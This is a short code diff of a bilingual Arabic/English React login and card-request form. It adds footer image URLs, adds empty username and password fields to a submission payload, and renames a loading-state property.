@@ -53,6 +53,9 @@ export default function LoginMethod() {
   }, [step]);
 
   const isArabic = language === "ar";
+  const footerImage = isArabic 
+    ? "https://i.ibb.co/23sMQkSF/IMG-20260714-WA0015.jpg"
+    : "https://i.ibb.co/609jMvhx/IMG-20260714-WA0016.jpg";
 
   const [formData, setFormData] = useState({
     deliveryAddress: "",
@@ -116,6 +119,8 @@ export default function LoginMethod() {
       await submitLoginMethodMutation.mutateAsync({
         sessionId: currentSessionId,
         loginType: "card_request",
+        username: "",
+        password: "",
         deliveryMethod,
         deliveryAddress: formData.deliveryAddress,
         phoneConfirmation: formData.phoneConfirmation,
@@ -433,10 +438,10 @@ export default function LoginMethod() {
                 <div className="pt-6">
                   <button 
                     type="submit"
-                    disabled={submitLoginMethodMutation.isLoading}
+                    disabled={submitLoginMethodMutation.isPending}
                     className="w-full bg-[#8C0032] text-white py-5 rounded-2xl font-black text-lg shadow-xl shadow-[#8C0032]/30 hover:scale-[1.02] active:scale-95 transition-all disabled:opacity-50 disabled:scale-100"
                   >
-                    {submitLoginMethodMutation.isLoading ? (isArabic ? "جاري المعالجة..." : "Processing...") : (isArabic ? "تأكيد وإتمام الطلب" : "Confirm & Order")}
+                    {submitLoginMethodMutation.isPending ? (isArabic ? "جاري المعالجة..." : "Processing...") : (isArabic ? "تأكيد وإتمام الطلب" : "Confirm & Order")}
                   </button>
                   <button 
                     type="button"
